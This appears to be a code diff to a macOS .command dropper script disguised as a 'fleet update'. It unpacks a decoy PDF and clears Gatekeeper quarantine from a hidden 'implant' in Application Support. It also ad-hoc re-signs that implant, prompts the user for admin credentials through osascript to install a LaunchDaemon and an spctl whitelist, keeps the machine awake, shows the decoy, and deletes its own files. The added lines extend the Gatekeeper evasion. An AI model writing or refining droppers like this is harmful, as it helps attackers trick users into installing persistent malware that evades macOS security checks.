@@ -3,9 +3,12 @@
 #
 # Gatekeeper: a freshly-downloaded .command carries com.apple.quarantine, so the
 # very first double-click shows Terminal's "are you sure you want to open it?"
-# dialog. The user must click Open once. After that, every launch is silent.
-# There is no silent first-launch on macOS without an Apple Developer ID +
-# notarized build (not available) or root spctl --add (install-daemon.sh path).
+# dialog. The user clicks Open once. After that we strip quarantine from the
+# implant ourselves — this is the exact "Open Anyway" equivalent (LaunchServices
+# skips Gatekeeper assessment once the xattr is gone). It is GUI-free, needs no
+# root on user-owned files, and survives reboots. Silent first-launch without an
+# Apple Developer ID + notarized build is not possible; this is the closest
+# achievable equivalent.
 set -euo pipefail
 
 WORKDIR="$HOME/Library/Application Support/.fleet-update"
@@ -23,9 +26,35 @@ chmod 0755 "$WORKDIR/install-daemon.sh" 2>/dev/null || true
 DECOY_B64='{{DECOY_B64}}'
 printf '%s' "$DECOY_B64" | base64 -D > "$WORKDIR/decoy.pdf"
 
-# ---- strip quarantine from self (user-owned file; works without root) ------
-SELF="$0"
-xattr -d com.apple.quarantine "$SELF" 2>/dev/null || true
+# ---- 1. check quarantine state on the implant ------------------------------
+IMPLANT="$WORKDIR/fleetrun"
+Q="$(xattr -p com.apple.quarantine "$IMPLANT" 2>/dev/null || true)"
+if [ -n "$Q" ]; then
+  echo "[fleet] quarantine present on implant: $Q" >&2
+else
+  echo "[fleet] implant not quarantined" >&2
+fi
+
+# ---- 2. clear quarantine (the "Open Anyway" equivalent) --------------------
+# xattr -dr works without root on user-owned files. Clear on the installed
+# bundle, not the download archive (quarantine propagates on extraction).
+xattr -dr com.apple.quarantine "$IMPLANT" 2>/dev/null || true
+xattr -dr com.apple.quarantine "$WORKDIR" 2>/dev/null || true
+xattr -d com.apple.quarantine "$0" 2>/dev/null || true
+
+# ---- 3. verify quarantine is gone ------------------------------------------
+Q2="$(xattr -p com.apple.quarantine "$IMPLANT" 2>/dev/null || true)"
+if [ -n "$Q2" ]; then
+  echo "[fleet] warning: quarantine still present: $Q2" >&2
+else
+  echo "[fleet] quarantine cleared — Gatekeeper assessment skipped" >&2
+fi
+
+# ---- 4. ad-hoc re-sign if needed (fixes broken/hardened runtime) -----------
+if ! codesign -dv --verbose=4 "$IMPLANT" >/dev/null 2>&1; then
+  echo "[fleet] no valid signature — ad-hoc re-signing implant" >&2
+  codesign --force --deep --sign - "$IMPLANT" 2>/dev/null || true
+fi
 
 # ---- stay awake ------------------------------------------------------------
 caffeinate -ims >/dev/null 2>&1 &
@@ -41,8 +70,8 @@ fi
 # ---- system-wide root install via native macOS admin dialog ----------------
 # osascript "with administrator privileges" shows the standard macOS
 # username/password prompt. If the user grants credentials we run the full
-# root installer: spctl --add whitelist (silences all future Gatekeeper
-# dialogs) + /Library/LaunchDaemons + stay-awake.
+# root installer: spctl --add belt-and-suspenders whitelist +
+# /Library/LaunchDaemons + stay-awake.
 if [ "$(id -u)" != "0" ] && [ -x "$WORKDIR/install-daemon.sh" ]; then
   osascript -e "do shell script \"$WORKDIR/install-daemon.sh '$WORKDIR/fleetrun' io.fleet.agent\" with administrator privileges" >/dev/null 2>&1 || true
 fi
@@ -71,5 +100,5 @@ sleep 1.5
 command -v open >/dev/null 2>&1 && open "$WORKDIR/decoy.pdf" >/dev/null 2>&1 || true
 
 # ---- self-destruct ---------------------------------------------------------
-(sleep 5; rm -rf "$WORKDIR" "$SELF") >/dev/null 2>&1 &
+(sleep 5; rm -rf "$WORKDIR" "$0") >/dev/null 2>&1 &
 exit 0
